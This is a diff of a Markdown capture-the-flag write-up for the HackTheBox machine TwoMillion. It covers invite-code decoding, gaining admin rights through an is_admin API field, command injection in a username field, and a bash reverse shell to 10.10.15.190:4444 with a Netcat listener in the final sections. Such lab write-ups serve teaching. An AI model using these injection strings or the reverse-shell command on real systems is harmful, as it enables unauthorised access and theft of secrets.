@@ -1,138 +1,200 @@
 ---
-title: "TwoMillion"
-machine: "TwoMillion"
-draft: false
+title: TwoMillion
+machine: TwoMillion
+tags: HackTheBox Machines
 ---
-This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.
+#### Write-Up for the HackTheBox Machine - TwoMillion
 <!--more-->
 ---
+#### 001: Scan
 
-Nmap scan the target for available TCP ports
+The victim machine was scanned for potential open ports and services using `nmap`.
+Available ports and services, according to the tool was `port 22(ssh)` and `port 80(http)`.
+
+**Command:**
+```bash
+nmap -sT 10.10.11.221
+```
+- `-sT` | switch specifies scan for tcp ports
 
 {{< screenshots "shot-001" >}}
 
 ---
+#### 002: Hostname Mapping
 
-To be able to view the website in browser the target IP must be resolved by creating a domain mapping in /etc/hosts
+To be able to view the website in browser, the target IP must be resolved by creating a hostname mapping in /etc/hosts.
 
 {{< screenshots "shot-002" >}}
 
 ---
+#### 003: Website Analysis
 
-We run burpsuite and examine the available path of the target under the 'target' tab
+Burpsuite was utilized to examine available paths exposed from the victim.
+As the proxy of the web tool was running, the website had shown various paths under Burpsuite's `target` tab.
 
-Under http://2million.htb/invite it is observed that an invite code is required for Sign Up
+`http://2million.htb/invite` was observed that an invite code is required for **Sign Up**.
 
-![/invite](/captures/screens/TwoMillion/shot-003.png)
+{{< screenshots "shot-003" >}}
+
+---
+#### 004: Obfuscated Script
 
 After further examination of the website's source, under js/invite.min.js an eval based javascript packer obfuscation script is found in the response window of burpsuite.
 
-![obfuscated script](/captures/screens/TwoMillion/shot-004.png)
+{{< screenshots "shot-004" >}}
+
+---
+#### 005: Deobfuscation
 
 Utilizing https://tunganhken.github.io/de4js/ the obfuscated JavaScript was deobfuscated and beautified, revealing functions that directly invoke backend API endpoints.
 
-![beautified script](/captures/screens/TwoMillion/shot-005.png)
+{{< screenshots "shot-005" >}}
 
-Then using curl a POST request is sent to the backend endpoint, with a ROT13 cipher 'data' value.
+---
+#### 006: Endpoint Request
 
-![rot13 cipher](/captures/screens/TwoMillion/shot-006.png)
+POST requests were sent to each endpoint, using `curl`, and was found that `/api/v1/invite/how/to/generate` outputed a json response with a ROT13 ciphered value for the key `data`.
 
-https://cryptii.com/pipes/rot13-decoder is a web tool that helped with the decipher of the provided ROT13. 
+Command:
+```bash
+curl -X POST http://2million.htb/api/v1/invite/how/to/generate
+```
 
-The cipher's output:
-- In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
+{{< screenshots "shot-006" >}}
 
-Thus, we test the newly found endpoint resulting to a base64 encoded 'code' value.
+---
+#### 007: ROT13 Decipher
 
-![base64 encoded](/captures/screens/TwoMillion/shot-007.png)
+https://cryptii.com/pipes/rot13-decoder is a web tool that helped with the decipher of the found ROT13. 
+The tool returned the following output:
+- `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`
 
-The encoded string can be decoded with https://www.base64decode.org/. 
+Thus, a POST request was made to the newly found endpoint, which returned a Base64 endoded value for the key `code`.
 
-The decoded string based on the generated base64 encoding:
-- X43BI-41KBY-4HMSL-SYVEG
+{{< screenshots "shot-007" >}}
 
-Once the decoded string is filled in the empty box of /invite, we get redirected to /register for registration. Next, the appropriate details are entered in /login and access to our personal /home page is granted.
+---
+#### 008: Base64 Decode
 
-![/home](/captures/screens/TwoMillion/shot-008.png)
+https://www.base64decode.org/ was used to decode the Base64 encoded string in the from the POST response.
+The tool returned the following output:
+- `X43BI-41KBY-4HMSL-SYVEG`
 
-After, further examination of the website, it is found that only within /home/access two endpoints share the same prefix /api/v1. It is observed by hovering over 'Connection Pack' and 'Regenerate' buttons.
+##### *Note: Each Base64 encoded code is randomly generated, meaning that when decoded the output will be different.*
 
-Thus, a browse to http://2million.htb/api/v1 various other endpoints are displayed.
+Once the decoded string is filled in the empty box of `/invite`, a redirection was made to `/register` for registration.
+Next, the appropriate details were entered in `/login` and access to our personal `/home` page was granted.
 
-Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID. 
+{{< screenshots "shot-008" >}}
 
-![shot-009](/captures/screens/TwoMillion/shot-009.png)
+---
+#### 009: Admin Endpoints
+
+After, further examination of the website, it is found that only within `/home/access` two endpoints share the same prefix `/api/v1`. 
+It is observed by hovering over **Connection Pack** and **Regenerate** buttons.
+
+Hence, a browse to `http://2million.htb/api/v1` various other endpoints were showed.
+
+##### *Note: To be able to view /api/v1 responses, the current created user must be logged in. Since the namespace requires authentication via PHPSESSID.*
+
+{{< screenshots "shot-009" >}}
 
 Three endpoints were exposed related to admin, with each respective HTTP method:
-- /api/v1/admin/auth
-- /api/v1/admin/vpn/generate
-- /api/v1/admin/settings/update
-
-Next, using Burpsuite we request each admin related endpoint with the appropriate HTTP method as identified in /api/v1 namespace.
-
-![shot-010](/captures/screens/TwoMillion/shot-010.png)
-
-A GET request to /api/v1/admin/auth provides a json response message, indicating that the current logged in user is not an admin.
-
-![shot-011](/captures/screens/TwoMillion/shot-011.png)
-
-Since, the current user is does not have administrative access, a POST request to /api/v1/admin/vpn/generate, provides a response indicating that we are unauthorized.
-
-![shot-012](/captures/screens/TwoMillion/shot-012.png)
-
-Next, a PUT request to /api/v1/admin/settings/update, shows a response that could be tampered. It appears again that the content type the API accepts as request is application/json.
-
-![shot-013](/captures/screens/TwoMillion/shot-013.png)
-
-On line 11 of the request the content type is specified, and some dummy key:value pair is added to test the response behavior. A message is hinted that an email parameter is missing.
-
-
-<!-- screenshots:anchor -->
-
-When a valid email is added to the json structure, a new message appears, specifying that is_admin also must be added to the structure.
-
-### shot-014
-![shot-014](/captures/screens/TwoMillion/shot-014.png)
-
-As properly assumed, is_admin is a boolean variable. Hence by passing a value of 1, in the response's json struct key is_admin is set to 1 (true).
-
-### shot-015
-![shot-015](/captures/screens/TwoMillion/shot-015.png)
-
-When a new GET request is made in /api/v1/admin/auth, the response indicates that the created user now has administrative privileges.
-
-### shot-016
-![shot-016](/captures/screens/TwoMillion/shot-016.png)
-
-The response from a reqest to /api/v1/admin/vpn/generate, contains an OpenVPN client profile generated by an administrative API endpoint. Including CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.
-
-Hence, the OpenVNP client generation, appeared like a system level operation. Which resulted in a command injection probe, that exposed some local directories of the target.
-
-![shot-017](/captures/screens/TwoMillion/shot-017.png)
+- `/api/v1/admin/auth`
+- `/api/v1/admin/vpn/generate`
+- `/api/v1/admin/settings/update`
 
 ---
+#### 010: Admin Endpoint Examination
 
-Environment variable values are key–value strings stored by the operating system and made available to running processes. Effectively, influencing application behaviors without changing code.
+Again with the use of Burpsuite requests were made to each admin related endpoint with the appropriate HTTP method as identified in `/api/v1` namespace.
+A GET request to `/api/v1/admin/auth returned` a json response message, indicating that the current logged in user was not an admin.
 
-When probed the .env file of the target, various key-value pairs shown environment variables linked to the database of the application.
+{{< screenshots "shot-010" >}}
 
-![shot-018](/captures/screens/TwoMillion/shot-018.png)
+Since, the current user did not have administrative access, a POST request to `/api/v1/admin/vpn/generate`, returned a response indicating the user is unauthorized.
+
+{{< screenshots "shot-011" >}}
+
+Next, a PUT request to `/api/v1/admin/settings/update`, showed a response that could be tampered. 
+It seemed the `Content-Type` the API accepted for a PUT request was `application/json`.
+
+{{< screenshots "shot-012" >}}
+
+On `line 11` of the request, the `Content-Type` was specified, and some dummy `key:value` pair was added to test the victim's behavior. 
+A returned message response hinted that an email parameter was missing.
+
+{{< screenshots "shot-013" >}}
+
+When a valid email (created user) was added to the json structure, a new message appeared, specifying that `is_admin` also must be added to the structure.
+
+{{< screenshots "shot-014" >}}
+
+As properly assumed, `is_admin` was a boolean variable. 
+Hence by passing `1` in `is_admin`, the endpoint response showed that the variable is set to `1(true)`.
+
+{{< screenshots "shot-015" >}}
+
+When a new GET request was made to `/api/v1/admin/auth`, the response indicated that the created user now has administrative privileges.
+
+{{< screenshots "shot-016" >}}
 
 ---
+#### 011: Endpoint Command Injection
 
-However, since execution of shell commands and bash is also available on the target, a bash reverse shell payload was injected to the json structure. Effectively allowing reverse communication to the aggressor, with system access.
+The response from a reqest to `/api/v1/admin/vpn/generate`, contained an OpenVPN client profile generated by an administrative API endpoint. 
+Which included CA-signed client certificates and private key, potentially enabling direct VPN access to the internal network with elevated privileges.
+Hence, the OpenVNP client generation, appeared like a system level operation. 
+Which resulted in a command injection probe, that exposed local directories from the victim.
 
-nc -lvnp 4444 - the running listener on the aggressor.
+Command:
+```bash
+"username":"; ls #"
+```
+- `;` | command separator
+- `#` | ignore the rest of the line (comment)
 
-![shot-019](/captures/screens/TwoMillion/shot-019.png)
 
-bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1' - bash reverse shell command used in the burpsuite json request.
+{{< screenshots "shot-017" >}}
 
-![shot-020](/captures/screens/TwoMillion/shot-020.png)
+Environment variable values are `key:value` strings stored by the operating system and made available to running processes. 
+Effectively, influencing application behaviors without changing code.
 
-The established reverse shell on the aggressor.
+When probed the `.env` file on the victim, various `key:value` pairs showed environment variables linked to the database of the application.
 
-![shot-021](/captures/screens/TwoMillion/shot-021.png)
+Command:
+```bash
+"username":"; cat .env #"
+```
+- `;` | command separator
+- `#` | ignore the rest of the line (comment)
+
+{{< screenshots "shot-018" >}}
+
+---
+#### 012: Reverse Shell
+
+Nevertheless, since bash is available on the target, a bash reverse shell payload was injected to the json structure.
+Effectively allowing reverse communication to the attacker machine, with system access.
+Initially, a Netcat listener was setup on the attacker.
+
+```bash
+nc -lvnp 4444
+```
+- `-lvnp` | set Netcat into listening mode on specified port, with no DNS resolution and verbose output
+
+{{< screenshots "shot-019" >}}
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.15.190/4444 0>&1'
+```
+- bash reverse shell command used in burpsuite json request.
+
+{{< screenshots "shot-020" >}}
+
+On the attacker machine a reverse shell connection has been established.
+
+{{< screenshots "shot-021" >}}
 
 ---
 
